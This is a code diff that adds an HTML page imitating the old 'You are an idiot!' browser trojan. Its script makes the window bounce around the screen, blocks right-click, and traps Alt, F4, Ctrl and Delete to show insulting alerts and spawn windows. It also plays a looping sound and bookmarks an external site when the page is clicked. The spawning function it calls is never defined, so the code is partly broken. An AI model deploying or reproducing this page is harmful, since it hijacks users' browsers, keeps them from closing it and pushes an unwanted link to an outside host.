@@ -1,0 +1,60 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+    <title>You are an idiot!</title>
+</head>
+<body bgcolor="#ffffff" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" onclick="addBookmark()">
+    
+    <img src="flashl.gif" alt="You are an idiot!" width="640" height="480">
+    <bgsound src="idiotl.mp3" loop="infinite">
+
+    <script language="Javascript">
+        function blockRightClick() {
+            return false;
+        }
+
+        // --- Same bookmark function, pointing to the main legacy page ---
+        function addBookmark() {
+            if (navigator.appName == "Microsoft Internet Explorer" && parseInt(navigator.appVersion) >= 4) {
+                window.external.AddFavorite("https://yaai.adngsnews.site/legacy.html", "You are an idiot!");
+            }
+        }
+
+        var flagRun = 1;
+        var xOff = 5;
+        var yOff = 5;
+        var xPos = 400;
+        var yPos = -100;
+
+        function playBall() {
+            if (flagRun != 1) return;
+            xPos += xOff;
+            yPos += yOff;
+            if (xPos > screen.width - 357) xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+            if (xPos < 0) xOff = Math.ceil(7 * Math.random()) * 5 - 10;
+            if (yPos > screen.height - 330) yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+            if (yPos < 0) yOff = Math.ceil(7 * Math.random()) * 5 - 10;
+            window.moveTo(xPos, yPos);
+            setTimeout("playBall()", 1);
+        }
+
+        function keyTrap() {
+            if (event.keyCode == 18 || event.keyCode == 115) {
+                alert("You are an idiot!");
+                procreate();
+            }
+            if (event.keyCode == 17) {
+                alert("You are an idiot!");
+                procreate();
+            }
+            if (event.keyCode == 46) {
+                alert("You are an idiot!");
+                procreate();
+            }
+        }
+
+        document.onkeydown = keyTrap;
+        document.oncontextmenu = blockRightClick;
+    </script>
+</body>
+</html>
